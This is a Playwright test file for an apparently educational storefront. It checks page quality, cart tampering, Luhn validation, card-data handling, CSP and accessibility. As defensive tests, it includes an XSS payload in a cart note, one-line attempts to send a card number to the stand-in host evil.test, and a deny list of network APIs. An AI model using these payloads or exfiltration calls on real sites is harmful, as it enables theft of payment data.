// tests/site.test.js
// Automatic checks for the OTGTech storefront. Run them with:  npm install  then  npm test
// (First time only: npx playwright install chromium)
//
// What this proves, in a real browser (Chromium through Playwright):
//   1. Every page loads with no JavaScript errors, no sideways scroll on a phone, one h1,
//      and the VE disclaimer in the footer.
//   2. Every link, image and script a page points to exists.
//   3. A tampered cart (edited localStorage) can't break the page or inject HTML.
//   4. The Luhn card check gives the right answers.
//   5. The card number rules from the brief: cleared, never saved, nothing sent.
//   6. The checkout Content-Security-Policy blocks what we claim it blocks, and the one
//      thing it can NOT block (navigating away) is written down as a known limit.
//   7. No page has accessibility violations (axe-core, WCAG 2.2 AA).

const test = require("node:test");
const assert = require("node:assert");
const fs = require("node:fs");
const path = require("node:path");
const { chromium } = require("playwright");

const ROOT = path.resolve(__dirname, "..");
const PAGES = ["index", "shop", "how-it-folds", "specs", "about", "contact", "cart", "checkout"];
const url = (name) => "file://" + path.join(ROOT, name + ".html");
const CARD = "4242 4242 4242 4242";

let browser;
test.before(async () => { browser = await chromium.launch(); });
test.after(async () => { await browser.close(); });

// A new page where Google Fonts are blocked (so tests don't depend on the internet)
// and every other outside request is recorded.
async function newPage(width = 390) {
  const context = await browser.newContext({ viewport: { width, height: 900 } });
  const outside = [];
  await context.route(/^https?:/, (route) => {
    const u = route.request().url();
    if (!/fonts\.(googleapis|gstatic)\.com/.test(u)) outside.push(route.request().resourceType() + " " + u);
    route.abort();
  });
  const page = await context.newPage();
  const errors = [];
  page.on("pageerror", (e) => errors.push(String(e)));
  page.on("console", (m) => { if (m.type() === "error" && !/ERR_FAILED|Failed to load resource/.test(m.text())) errors.push(m.text()); });
  return { page, context, errors, outside };
}

// ---------- 1. Every page ----------
for (const name of PAGES) {
  test(`${name}.html loads clean on a phone`, async () => {
    const { page, context, errors } = await newPage(390);
    await page.goto(url(name));
    await page.waitForTimeout(300);
    const info = await page.evaluate(() => ({
      overflow: document.documentElement.scrollWidth - document.documentElement.clientWidth,
      h1: document.querySelectorAll("h1").length,
      disclaimer: /educational purposes only/.test(document.body.innerText),
      brokenImages: [...document.images].filter((i) => i.complete && i.naturalWidth === 0).map((i) => i.src)
    }));
    assert.deepStrictEqual(errors, [], "JavaScript errors");
    assert.strictEqual(info.overflow, 0, "page scrolls sideways");
    assert.strictEqual(info.h1, 1, "needs exactly one h1");
    assert.ok(info.disclaimer, "VE disclaimer missing from the footer");
    assert.deepStrictEqual(info.brokenImages, []);
    await context.close();
  });
}

// ---------- 2. Links, images, scripts ----------
test("every local link, image, script and stylesheet exists", () => {
  const missing = [];
  for (const name of PAGES.concat("404")) {
    const html = fs.readFileSync(path.join(ROOT, name + ".html"), "utf8");
    for (const m of html.matchAll(/(?:href|src|poster)="([^"]+)"/g)) {
      const ref = m[1];
      if (/^(https?:|mailto:|tel:|data:|#)/.test(ref)) continue;
      const file = ref.split("#")[0].split("?")[0].replace(/^\//, "");
      if (file && !fs.existsSync(path.join(ROOT, file))) missing.push(`${name}.html -> ${ref}`);
    }
  }
  assert.deepStrictEqual(missing, []);
});

test("every page has the VE disclaimer text in its source", () => {
  for (const name of PAGES.concat("404")) {
    const html = fs.readFileSync(path.join(ROOT, name + ".html"), "utf8");
    assert.match(html, /educational purposes only/, name);
  }
});

// ---------- 3. Tampered cart ----------
async function cartWith(page, value) {
  await page.goto(url("shop"));
  await page.evaluate((v) => localStorage.setItem("otgtech-cart", v), value);
}

test("tampered cart: junk, wrong types and fake products are dropped", async () => {
  const { page, context, errors } = await newPage();
  const bad = JSON.stringify([
    { sku: "NOT-A-REAL-SKU", qty: 1 },
    { sku: "PF-LTH-BLK", qty: -5 },
    { sku: "PF-LTH-BLK", qty: "abc" },
    { sku: "PF-LTH-BLK", qty: 1, price: 0.01 },      // a price field must be ignored
    { sku: { toString: 1 }, qty: 1 },
    null, 7, "text"
  ]);
  await cartWith(page, bad);
  await page.goto(url("cart"));
  const text = await page.innerText("main");
  assert.deepStrictEqual(errors, []);
  assert.match(text, /\$399\.00/, "price must come from products.js, not from the saved cart");
  assert.doesNotMatch(text, /\$0\.01/);
  assert.strictEqual(await page.locator("#cart-list > li").count(), 1);
  await context.close();
});

test("tampered cart: not JSON, not an array, and huge carts don't break the page", async () => {
  const { page, context, errors } = await newPage();
  for (const value of ["{not json", '{"a":1}', "null", JSON.stringify(Array.from({ length: 5000 }, (_, i) => ({ sku: "PF-LTH-BLK", qty: 10, note: "n" + i })))]) {
    await cartWith(page, value);
    await page.goto(url("cart"));
    const lines = await page.locator("#cart-list > li").count();
    assert.ok(lines <= 50, "cart is capped at 50 lines, got " + lines);
  }
  assert.deepStrictEqual(errors, []);
  await context.close();
});

test("a cart note with HTML is shown as text and creates no elements", async () => {
  const { page, context } = await newPage();
  const note = '<img src=x onerror="window.__pwned=1"><script>window.__pwned=1</script>';
  await cartWith(page, JSON.stringify([{ sku: "PF-LTH-BLK", qty: 1, note }]));
  for (const name of ["cart", "checkout"]) {
    await page.goto(url(name));
    await page.waitForTimeout(200);
    assert.strictEqual(await page.evaluate(() => window.__pwned), undefined, name + ": script ran");
    assert.strictEqual(await page.locator("main img[src='x']").count(), 0, name + ": img was created");
  }
  await context.close();
});

// ---------- 4. Luhn ----------
test("Luhn check", async () => {
  const { page, context } = await newPage();
  await page.goto(url("checkout"));
  const luhn = (d) => page.evaluate((x) => passesLuhn(x), d);
  assert.strictEqual(await luhn("4242424242424242"), true);
  assert.strictEqual(await luhn("4111111111111111"), true);
  assert.strictEqual(await luhn("378282246310005"), true);     // 15-digit test card
  assert.strictEqual(await luhn("4242424242424243"), false);   // one digit off
  assert.strictEqual(await luhn("4242424242424224"), false);   // two digits swapped
  assert.strictEqual(await luhn("abcd"), false);
  assert.strictEqual(await luhn(""), false);
  assert.strictEqual(await luhn("4242424242424242\n"), false); // a trailing newline must not slip through
  // KNOWN LIMIT: Luhn only catches typos. A string of zeros passes it. That's fine, because it is
  // not meant to prove a card is real. It's here so nobody thinks Luhn is "validation".
  assert.strictEqual(await luhn("0000000000000"), true);
  await context.close();
});

// ---------- 5. The card rules from the brief ----------
async function fillCheckout(page, card = CARD) {
  await page.fill("#ship-name", "Test Person");
  await page.fill("#ship-address", "1 Main St");
  await page.fill("#ship-city", "Bayville");
  await page.fill("#ship-state", "NY");
  await page.fill("#ship-zip", "11709");
  await page.fill("#card-number", card);
  await page.fill("#card-expiry", "12/40");
  await page.fill("#card-cvc", "123");
}

test("checkout: a bad card number is rejected and the order is not placed", async () => {
  const { page, context } = await newPage();
  await cartWith(page, JSON.stringify([{ sku: "PF-LTH-BLK", qty: 1, note: "" }]));
  await page.goto(url("checkout"));
  await fillCheckout(page, "4242 4242 4242 4243");
  await page.click("button[type=submit]");
  assert.ok(await page.locator("#card-number-error").isVisible());
  assert.ok(await page.locator("#confirmation").isHidden());
  assert.match(await page.evaluate(() => localStorage.getItem("otgtech-cart")), /PF-LTH-BLK/, "cart must be kept");
  await context.close();
});

test("checkout: card is cleared, never saved, never logged, never sent", async () => {
  const { page, context, outside } = await newPage();
  const logs = [];
  page.on("console", (m) => logs.push(m.text()));
  await cartWith(page, JSON.stringify([{ sku: "PF-CF-BLK", qty: 2, note: "" }]));
  await page.goto(url("checkout"));
  await fillCheckout(page);
  await page.click("button[type=submit]");
  await page.waitForSelector("#confirmation:not([hidden])");

  for (const id of ["card-number", "card-expiry", "card-cvc"]) {
    assert.strictEqual(await page.inputValue("#" + id), "", id + " not cleared");
  }
  const stored = await page.evaluate(() => JSON.stringify({ ...localStorage }) + JSON.stringify({ ...sessionStorage }) + document.cookie);
  assert.doesNotMatch(stored, /4242/, "card digits in browser storage");
  assert.doesNotMatch(logs.join("\n"), /4242/, "card digits in the console");
  // Only the confirmation: the checkout page itself prints the test card as a hint for visitors.
  assert.doesNotMatch(await page.innerText("#confirmation"), /4242/, "card digits on the confirmation");
  assert.deepStrictEqual(outside, [], "the page made outside requests");
  assert.match(await page.innerText("#confirmation"), /\$998\.00/);
  assert.strictEqual(await page.evaluate(() => localStorage.getItem("otgtech-cart")), "[]", "cart must be emptied");
  await context.close();
});

test("checkout: no field has a name attribute, so nothing could ever be submitted", async () => {
  const { page, context } = await newPage();
  await page.goto(url("checkout"));
  assert.strictEqual(await page.locator("#checkout-form [name]").count(), 0);
  await context.close();
});

// ---------- 6. The Content-Security-Policy ----------
// "leaked" means a request to the attacker's address actually reached the network layer.
async function tryLeak(action) {
  const context = await browser.newContext();
  const leaked = [];
  await context.route(/evil\.test/, (route) => { leaked.push(route.request().resourceType()); route.fulfill({ status: 200, contentType: "text/html", body: "ok" }); });
  await context.route(/fonts\.(googleapis|gstatic)\.com/, (r) => r.abort());
  const page = await context.newPage();
  await page.goto(url("checkout"));
  await page.evaluate(action).catch(() => {});
  await page.waitForTimeout(400);
  await context.close();
  return leaked;
}

test("CSP blocks fetch, images, beacons and form posts on the checkout page", async () => {
  assert.deepStrictEqual(await tryLeak("fetch('https://evil.test/?c=4242').catch(()=>{})"), [], "fetch");
  assert.deepStrictEqual(await tryLeak("new Image().src='https://evil.test/p.png?c=4242'"), [], "image");
  assert.deepStrictEqual(await tryLeak("navigator.sendBeacon('https://evil.test/?c=4242')"), [], "beacon");
  assert.deepStrictEqual(await tryLeak("(()=>{const f=document.createElement('form');f.action='https://evil.test/';f.method='post';document.body.appendChild(f);f.submit()})()"), [], "form");
  assert.deepStrictEqual(await tryLeak("(()=>{const s=document.createElement('script');s.src='https://evil.test/x.js';document.head.appendChild(s)})()"), [], "script");
});

// KNOWN LIMIT. This test passes when the limit is still there. A Content-Security-Policy cannot stop
// the page from navigating to another address, so protection against that is "never write code that does".
// If a future browser gets a way to block it, this test will fail, and that's good news: delete this
// test and add the new policy to checkout.html.
test("KNOWN LIMIT: CSP does not stop the page navigating away", async () => {
  const leaked = await tryLeak("location.href='https://evil.test/?c=4242'");
  assert.deepStrictEqual(leaked, ["document"]);
});

test("checkout.js never navigates, opens windows, or makes requests", () => {
  const code = fs.readFileSync(path.join(ROOT, "js", "checkout.js"), "utf8").replace(/\/\/.*$/gm, "");
  for (const bad of [/location\s*[.=]/, /window\.open/, /fetch\s*\(/, /XMLHttpRequest/, /sendBeacon/, /WebSocket/, /console\./, /localStorage\.setItem/, /sessionStorage/, /innerHTML/]) {
    assert.doesNotMatch(code, bad, String(bad));
  }
});

// ---------- 7. Accessibility ----------
const axeSource = fs.existsSync(path.join(ROOT, "node_modules/axe-core/axe.min.js"))
  ? fs.readFileSync(path.join(ROOT, "node_modules/axe-core/axe.min.js"), "utf8") : null;
for (const name of PAGES) {
  test(`${name}.html has no accessibility violations (axe, WCAG 2.2 AA)`, { skip: !axeSource && "run npm install first" }, async () => {
    const { page, context } = await newPage(390);
    await page.goto(url(name));
    await page.waitForTimeout(300);
    await page.evaluate(axeSource);
    const result = await page.evaluate(() => axe.run(document, { runOnly: ["wcag2a", "wcag2aa", "wcag21aa", "wcag22aa", "best-practice"] }));
    assert.deepStrictEqual(result.violations.map((v) => v.id + ": " + v.nodes[0].target.join(" ")), []);
    await context.close();
  });
}
